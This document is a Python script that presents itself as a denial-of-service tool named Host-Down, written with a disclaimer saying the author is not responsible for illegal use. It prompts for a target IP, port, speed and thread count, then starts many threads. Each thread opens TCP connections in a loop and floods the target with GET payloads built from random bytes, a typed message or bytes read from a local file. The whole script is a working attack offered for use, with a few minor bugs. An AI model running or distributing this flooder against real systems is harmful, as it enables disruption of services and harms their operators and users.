
#!/usr/bin/env python3

'''{

	Author   : Hossam Hamdy
	Nickname : Metanoyet / <M3T4N0Y3T/>
	Facebook : /m3t4n0y3t
	Twitter  : /m3t4n0y3t
	GitHub   : /m3t4n0y3t
	
	The Author Doesn't Responsible For Any Illegal Useage !
	
	Message : 

		Thank You <. depascaldc .> I Have learn Alot From You <3
		Thanks For All My Freinds Who Supported Me Every Time.
		As You See This Message Now I Want To Ask You Something,
		Remember To Ask Allah For Bleesing Youssef'S Soul.
		Thank You !

		- The Author

	Copyright (C) 2020 | Hossam Hamdy | All Rights Reserved
	If You Have Any Problem With The Tool Mail Me :  m3t4n0y3t@gmail.com

}'''

import os
import time
from threading import Thread
import sys
import random
import socket



class color:

	# Colors Methods
    yellow  = '\033[93m'      # For Headers and Index Number
    red     = '\033[91m'      # For Alerts / msgs
    green   = '\033[92m'      # For Inputs
    blue    = '\033[94m'      # For loading
    cyan    = '\033[96m'      # For Success
    white   = '\033[97m'      # For Listting The Dir
    grey    = '\033[90m'      # For Borders and Input Info
    magenta = '\033[95m'      # For For Logos / Pink


class Data:

	InvError = color.red + '< Invalid Input >'  # invalid input error
	''' Error message '''
	ports_high_end  = color.red + '[ Port Number Must Be <= 65535 ] '
	value_error_msg = color.red + '[ You Must Enter An Integer Value ]'
	set_port_to_def = color.red + '[ We Will Set Port : 80 ]'
	input_out_of_range = color.red + '[ Input Out Of Range ]'
	file_doesnot_in_dir = color.red + "[ The File Doesn't In Dir ]"




##############################################################################################################
##############################################################################################################

def DetAttack(attack_choice):

	'''

	This Function Was Written to determine what is the data 
	whiche will be sent to the target.

	[ 1 ] Random Byets
	[ 2 ] Message
	[ 3 ] Binary Byets

	the eturn value is the value of attack type  - Data to Send

	'''

	if attack_choice == 1: # Random Byets

		DataToSend = random._urandom(2450)
		return DataToSend



	elif attack_choice == 2: # Message

		message = str(input(color.grey + "[ " + color.red + "Send Message" + color.grey + " ]  ::  " + color.green))
		DataToSend = message.encode("utf-8")
		return DataToSend



	elif attack_choice == 3:     #  Binary Byets

		current_path = os.getcwd()  # get the current path
		list_dir = os.listdir(current_path) # get all files and dir in the path
		''' header '''
		header_len = len(current_path) + 22
		print(color.grey + "\n*" + "-"*(header_len) + "*")
		print(color.grey + "|" + color.yellow + f" Files In The Path : {str(current_path)} " + color.grey + "|")
		print(color.grey+ "*" + "-"*(header_len) + "*")

		file_list = []      		#  to append all files in it
		file_counter = 1    		#  count how many files in the path
		for i in list_dir:
			if os.path.isfile(i):   # check if this item is a file or not
				file_list.append(i) # if true append this file to file list
				print(color.grey + "[ " + color.yellow + f"{file_counter}" + color.grey + " ]" + color.white + f"  {i}")
				file_counter += 1   # add 1 to the counter
			else:
				continue 

		while True:  # to still ask the user for a valid number
			try:
				file_number = int(input(color.red + "Enter File Number" + color.grey + " >>> "+ color.green )) # get file number
				if file_number > file_counter-1 or file_number < 1: # check if user enter a valid number in the interval
					print(color.white + Data.file_doesnot_in_dir)   # display error message 
				else:
					file_name = file_list[file_number-1] # resolve from number to name 
					print(file_name)
					break
			except ValueError: # if user enter str / float
				print(color.red + Data.value_error_msg)

		while True: # to still ask the user for a valid number
			try:
				bs = int(input(color.red + "Enter Number Of Byets" + color.grey + " >>> " + color.green)) # ask  user to enter how many byets To read
				block_size = bs
				break
			except ValueError:
				print(color.red + Data.value_error_msg)

		try:
			with open(f'{current_path}\\{file_name}','rb') as file:  # Reading File To Get Byets Binary 
				content = file.read(block_size) # read byets {block_size} from the file 
				print("Reading Done Successfully !")
		except:
			print('test')
		DataToSend = content
		return DataToSend

##############################################################################################################
##############################################################################################################


class functions:



	def CommandCheck(): # get Command Value 
		while True:
			try:
				command = int(input(color.grey + "*>>> " + color.green))
				if command > 3 or command < 1:
					print(Data.input_out_of_range)
				else:
					return command # return Valid command value 
					break
			except ValueError:
				print(Data.value_error_msg)


##############################################################################################################
##############################################################################################################

	def get_ip(): # get IP Address From User
		try:
			ia = str(input(color.grey + "[+] IP >>> "+ color.green)) # 
			while ia == '': 			# check that ip not None/Empty
				print(Data.InvError)
				ia = str(input(color.grey + "[+] IP >>> "+ color.green))
			reg = [0,1,2,3,4,5,6,7,8,9]
			size = len(ia)
			counter = 0
			for i in ia:
				if (i == '.' and '..' not in ia and ' ' not in ia) or i.isnumeric(): # 
					counter += 1
				else:
					continue
			''' check that ip not equal 1 digit and valid data in ip = ip leangth '''
			if counter == size and counter != 1:
				return ia
			else:
				print(Data.InvError)
		except ValueError: # if user enter Str Value
			print(Data.InvError)



	def get_port():

		while True:
			# start point
			high_end = 65535
			try:
				p = int(input(color.grey + "[+] Port >>> " + color.green)) # get port number
				while p > high_end: # if input > signed ports
					print(Data.InvError)
					p = int(input(color.grey + "[+] Port >>> " + color.green))
				return p # else return port number
				break
			except ValueError:
				'''       if the user enter string/any thing except int number           '''
				'''       ask user if he agree to set port number to 80                  '''
				'''       else bask to the start point to ask user for port number       '''
				print(Data.set_port_to_def)
				con = str(input(color.grey + "[?] Do You Agree <Y/N> " + color.green))
				if con == "Y" or con == "y":
					print(color.grey +  "[+] Port >>> " + color.green + "80")
					return 80
				else:
					print(Data.InvError) # back to start point



	def get_speed():
		''' the rate of attacking per the round
		this number must be int / if you ask me about 
		best speed number to use i'll told you 24 '''
		while True:
			try:
				sp = int(input(color.grey + "[+] Speed >>> "+ color.green)) # Get Speed Form The User
				while sp < 1:
					print(Data.InvError)
					sp = int(input(color.grey + "[+] Speed >>> "+ color.green))
				return sp
				break
			except ValueError: # invalid value
				print(Data.value_error_msg)


	def get_thread():
		'''  how many scripts will run at the same time 
		how many users will perform the attack<DDOS>'''
		while True:
			try:
				th = int(input(color.grey + "[+] Threads >>> "+ color.green)) # Get thread Form The User
				while th < 1:
					print(Data.InvError)
					th = int(input(color.grey + "[+] Threads >>> "+ color.green))
				return th
				break
			except ValueError: # invalid value
				print(Data.value_error_msg)

##############################################################################################################
##############################################################################################################

	def loading():
		''' animation loading '''
		for i in range(1,101):
			term = "█"
			progress = i+1
			stell = 100-(i)
			s = "░"*stell
			done = i
			final = f"\r        {term*progress}{s} {done}%"
			sys.stdout.write(final)
			time.sleep(0.02)



class UI:

	def tool_intro(): # Display tool Options
		print(color.grey + '*---------------------------*')
		print('| '+ color.yellow+'Host-Down V0.1 Options : '+color.grey + ' |')
		print('*---------------------------*')
		print('|')
		print(color.grey +'|   [ ' + color.white + '1' + color.grey + ' ] ' + color.yellow + 'Start DOS Attack')
		print(color.grey +'|   [ ' + color.white + '2' + color.grey + ' ] ' + color.yellow + 'Exit The Script\n' + color.grey + '|')
		# Wait for a command prompot Here #



	def attack_intro(): # Display Attack Options
		print(color.grey + '*-----------------------*')
		print('| ' + color.yellow + 'Choose Attack Options' + color.grey+' |')
		print(color.grey + '*-----------------------*')
		print('|')
		print(color.grey + '| [ ' + color.white + '1' + color.grey + ' ] ' + color.red + 'Start DOS Attack')
		print(color.grey + "|   |")
		print(color.grey + "|   |---" + "<[ "+ color.white + "1" + color.grey+" ]"+ color.yellow +" Attacking With Random Byets\n" + color.grey + "|   |")
		print(color.grey + "|   |------" + "<[ "+ color.white + "2" + color.grey+" ]"+ color.yellow +" Attacking With Message\n" + color.grey + "|   |")
		print(color.grey + "|   *---------" + "<[ "+ color.white + "3" + color.grey+" ]"+ color.yellow +" Attacking With Birary Reading\n" + color.grey + "|")
		# Wait for a command prompot Here #
		# then pass input to DetAttack function #



class Style:

	tool_logo = '''
		\t _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
		\t|   _    _           _              _____                        _  |
		\t|  | |  | |         | |            |  __ \  By: Hossam Hamdy    | | |
		\t|  | |__| | ___  ___| |_   ______  | |  | | _____      ___ __   | | |
		\t|  |  __  |/ _ \/ __| __| |______| | |  | |/ _ \ \ /\ / / '_ \  | | |
		\t|  | |  | | (_) \__ \ |_           | |__| | (_) \ V  V /| | | | |_| |
		\t|  |_|  |_|\___/|___/\__|          |_____/ \___/ \_/\_/ |_| |_| (_) |
		\t|_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _|\n'''


	attack_logo = '''
\t              _   _             _      __          ___ _ _     _____ _             _               
\t         /\  | | | |           | |     \ \        / (_) | |   / ____| |           | |              
\t        /  \ | |_| |_ __ _  ___| | __   \ \  /\  / / _| | |  | (___ | |_ __ _ _ __| |_             
\t <THE> / /\ \| __| __/ _` |/ __| |/ /    \ \/  \/ / | | | |   \___ \| __/ _` | '__| __|   <SOON>         
\t      / ____ \ |_| || (_| | (__|   <      \  /\  /  | | | |   ____) | || (_| | |  | |_   _   _   _ 
\t     /_/    \_\__|\__\__,_|\___|_|\_\      \/  \/   |_|_|_|  |_____/ \__\__,_|_|   \__| (_) (_) (_)\n'''


##########################< Attacking >#######################################################################
#######################################< Function >###########################################################

class Count: # packet countter
    packetc = 0 

######## Mian #################################################################################################
###############################################################################################################

os.system('cls')

print(color.yellow + Style.tool_logo)
UI.tool_intro()
main_command = functions.CommandCheck()


if   main_command == 1:

	# get attack options
	os.system('cls')
	print(color.yellow + Style.tool_logo)
	UI.attack_intro()
	sub_command = functions.CommandCheck()
	DataToSend = DetAttack(sub_command)


	# Get Attack DataToSend
	os.system('cls')
	print(color.yellow + Style.tool_logo)
	iip = functions.get_ip()
	ip = socket.gethostbyname(iip)
	port = functions.get_port()
	speed = functions.get_speed()
	Threads = functions.get_thread()
	time.sleep(2)


	# Attack logo 
	os.system('cls')
	print(color.blue + Style.attack_logo)
	print(color.red + "\n\t\t               The Author Doesn't Responsible For Any Illegal Useage !\n" + color.blue)
	functions.loading()


	# Attack Area

	def DOSS_Attack():
		try:
			while True:
				dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				try:
					dosSocket.connect((ip, port))
					for i in range(speed):
						try:
							suc_message = color.grey + "[ " + color.cyan+ str(Count.packetc) + color.grey + " ]" + color.magenta + " Packet " + color.green + " Sent Successfully " + color.yellow + " To :: " + color.blue + "<< " + color.magenta + f"{str(ip)}" + color.blue + " >> Throught << " + color.magenta + f"{str(port)}" + color.blue + " >>  @  " + color.white + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime())
							dosSocket.send(str.encode("GET ") + DataToSend + str.encode("HTTP/1.1 \r\n"))
							dosSocket.sendto(str.encode("GET ") + DataToSend + str.encode("HTTP/1.1 \r\n"), (ip, port))
							print(suc_message)
							Count.packetc = Count.packetc + 1
						except socket.error:
							print(color.red + "Error 404 Replay Not Found May Be Host Is Down @ " + color.cyan + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()))
						except KeyboardInterrupt:
							print(color.red + "<-> Canceled By Host-Down !")
				except socket.error:
					print(color.red + "Error 404 Replay Not Found May Be Host Is Down @ " + color.cyan + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()))
				except KeyboardInterrupt:
					print(color.red + "<-> Canceled By Host-Down !")
					goForDosThatThingSocket.close()
		except KeyboardInterrupt:
			print(color.red + "<-> Canceled By Host-Down !")

	try:
		print(color.blue + Style.attack_logo)
		print(color.red + "\n\t\t               The Author Doesn't Responsible For Any Illegal Useage !\n" + color.blue)
		for i in range(Threads):
			try:
				t = Thread(target = DOSS_Attack)
				t.start()
			except KeyboardInterrupt:
				print(color.red + "\r\n[-] Canceled by user")    
	except KeyboardInterrupt:
		print(color.red ++ "\r\n[-] Canceled by user")


elif main_command == 2:
	print(color.cyan + "\n\n\nThank you For Using Host-Down Tool\n\n\n")
	time.sleep(3)
	sys.exit()

os.system('pause')